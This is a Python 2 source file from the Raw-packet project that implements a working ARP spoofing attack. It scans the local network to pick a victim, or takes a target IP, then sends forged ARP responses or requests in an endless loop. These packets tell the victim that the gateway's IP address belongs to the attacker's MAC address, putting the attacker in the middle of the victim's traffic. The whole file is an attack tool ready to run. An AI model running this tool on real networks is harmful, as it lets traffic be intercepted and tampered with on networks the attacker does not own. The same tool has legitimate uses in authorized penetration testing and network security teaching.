#!/usr/bin/env python
# -*- coding: utf-8 -*-

# region Description
"""
arp_spoof.py: ARP spoofing
Author: Vladimir Ivanov
License: MIT
Copyright 2019, Raw-packet Project
"""
# endregion

# region Import

# region Add project root path
from sys import path
from os.path import dirname, abspath
path.append(dirname(dirname(dirname(abspath(__file__)))))
# endregion

# region Raw-packet modules
from raw_packet.Utils.base import Base
from raw_packet.Utils.network import ARP_raw
from raw_packet.Scanners.arp_scanner import ArpScan
# endregion

# region Import libraries
from argparse import ArgumentParser
from socket import socket, AF_PACKET, SOCK_RAW
from ipaddress import IPv4Address
from time import sleep
from prettytable import PrettyTable
# endregion

# region Check user, platform and create threads
Base = Base()
Base.check_user()
Base.check_platform()
arp = ARP_raw()
# endregion

# endregion

# region Authorship information
__author__ = 'Vladimir Ivanov'
__copyright__ = 'Copyright 2019, Raw-packet Project'
__credits__ = ['']
__license__ = 'MIT'
__version__ = '0.0.4'
__maintainer__ = 'Vladimir Ivanov'
__email__ = 'ivanov.vladimir.mail@gmail.com'
__status__ = 'Production'
# endregion

# region Parse script arguments
parser = ArgumentParser(description='ARP spoofing')

parser.add_argument('-i', '--interface', help='Set interface name for send ARP packets')
parser.add_argument('-t', '--target_ip', help='Set client IP address', default=None)
parser.add_argument('-g', '--gateway_ip', help='Set gateway IP address', default=None)
parser.add_argument('-r', '--requests', action='store_true', help='Send only ARP requests')
parser.add_argument('-q', '--quiet', action='store_true', help='Minimal output')

args = parser.parse_args()
# endregion

# region Print banner if argument quit is not set
if not args.quiet:
    Base.print_banner()
# endregion

# region Get listen network interface, your IP and MAC address, first and last IP in local network
if args.interface is None:
    Base.print_warning("Please set a network interface for send ARP packets ...")
network_interface = Base.netiface_selection(args.interface)

your_mac_address = Base.get_netiface_mac_address(network_interface)
if your_mac_address is None:
    print Base.c_error + "Network interface: " + network_interface + " does not have MAC address!"
    exit(1)

your_ip_address = Base.get_netiface_ip_address(network_interface)
if your_ip_address is None:
    Base.print_error("Network interface: ", network_interface, " does not have IP address!")
    exit(1)

first_ip_address = str(IPv4Address(unicode(Base.get_netiface_first_ip(network_interface))) - 1)
last_ip_address = str(IPv4Address(unicode(Base.get_netiface_last_ip(network_interface))) + 1)
# endregion

# region Get gateway IP address
gateway_ip_address = "1.1.1.1"
if args.gateway_ip is None:
    gateway_ip_address = Base.get_netiface_gateway(network_interface)
    if gateway_ip_address is None:
        Base.print_error("Network interface: ", network_interface, " does not have Gateway!")
        exit(1)
else:
    if not Base.ip_address_in_range(args.gateway_ip, first_ip_address, last_ip_address):
        Base.print_error("Bad value `-g, --gateway_ip`: ", args.gateway_ip,
                         "; Gateway IP address must be in range: ", first_ip_address + " - " + last_ip_address)
        exit(1)
    else:
        gateway_ip_address = args.gateway_ip
# endregion

# region Create global raw socket
socket_global = socket(AF_PACKET, SOCK_RAW)
socket_global.bind((network_interface, 0))
# endregion

# region General output
Base.print_info("Network interface: ", network_interface)
Base.print_info("Gateway IP address: ", gateway_ip_address)
Base.print_info("Your IP address: ", your_ip_address)
Base.print_info("Your MAC address: ", your_mac_address)
Base.print_info("First ip address: ", first_ip_address)
Base.print_info("Last ip address: ", last_ip_address)
# endregion

# region Set target IP address
target_ip_address = "1.1.1.1"
target_mac_address = "00:00:00:00:00:00"
arp_scan = ArpScan()

if args.target_ip is None:
    Base.print_info("Start ARP scan ...")
    results = arp_scan.scan(network_interface, 3, 3, None, True, gateway_ip_address)

    if len(results) > 0:
        if len(results) == 1:
            target_ip_address = results[0]['ip-address']
            target_mac_address = results[0]['mac-address']
        else:
            Base.print_info("Network devices found:")
            hosts_pretty_table = PrettyTable([Base.cINFO + 'Index' + Base.cEND,
                                              Base.cINFO + 'IP address' + Base.cEND,
                                              Base.cINFO + 'MAC address' + Base.cEND,
                                              Base.cINFO + 'Vendor' + Base.cEND])
            device_index = 1
            for device in results:
                hosts_pretty_table.add_row([str(device_index), device['ip-address'],
                                      device['mac-address'], device['vendor']])
                device_index += 1

            print hosts_pretty_table
            device_index -= 1
            current_device_index = raw_input(Base.c_info + 'Set device index from range (1-' + str(device_index) + '): ')

            if not current_device_index.isdigit():
                Base.print_error("Your input data is not digit!")
                exit(1)

            if any([int(current_device_index) < 1, int(current_device_index) > device_index]):
                Base.print_error("Your number is not within range (1-" + str(device_index) + ")")
                exit(1)

            current_device_index = int(current_device_index) - 1
            device = results[current_device_index]
            target_ip_address = device['ip-address']
            target_mac_address = device['mac-address']

        Base.print_info("Target IP address: ", target_ip_address)
        Base.print_info("Target MAC address: ", target_mac_address)

    else:
        Base.print_error("Сould not find hosts on local network")
        exit(0)
else:
    if not Base.ip_address_in_range(args.target_ip, first_ip_address, last_ip_address):
        Base.print_error("Bad value `-t, --target_ip`: ", args.target_ip,
                         "; Target IP address must be in range: ", first_ip_address + " - " + last_ip_address)
        exit(1)
    else:
        target_ip_address = args.target_ip
        Base.print_info("Get MAC address of IP: ", target_ip_address)
        target_mac_address = arp_scan.get_mac_address(network_interface, target_ip_address)
        if target_mac_address == "ff:ff:ff:ff:ff:ff":
            Base.print_error("Could not find device MAC address with IP address: ", target_ip_address)
            exit(1)
        else:
            Base.print_success("Find target: ", target_ip_address + " (" + target_mac_address + ")")
# endregion

# region Main function
if __name__ == "__main__":
    try:
        # region ARP spoofing with ARP requests
        if args.requests:
            Base.print_info("Send ARP requests to: ", target_ip_address + " (" + target_mac_address + ")")
            Base.print_info("Start ARP spoofing ...")
            while True:
                arp_request = arp.make_request(ethernet_src_mac=your_mac_address,
                                               ethernet_dst_mac=target_mac_address,
                                               sender_mac=your_mac_address,
                                               sender_ip=gateway_ip_address,
                                               target_mac="00:00:00:00:00:00",
                                               target_ip=Base.get_netiface_random_ip(network_interface))
                socket_global.send(arp_request)
                sleep(2)
        # endregion

        # region ARP spoofing with ARP responses
        else:
            Base.print_info("Send ARP responses to: ", target_ip_address + " (" + target_mac_address + ")")
            Base.print_info("Start ARP spoofing ...")
            arp_response = arp.make_response(ethernet_src_mac=your_mac_address,
                                             ethernet_dst_mac=target_mac_address,
                                             sender_mac=your_mac_address,
                                             sender_ip=gateway_ip_address,
                                             target_mac=target_mac_address,
                                             target_ip=target_ip_address)
            while True:
                socket_global.send(arp_response)
                sleep(2)
        # endregion

    except KeyboardInterrupt:
        socket_global.close()
        Base.print_info("Exit")
        exit(0)
# endregion
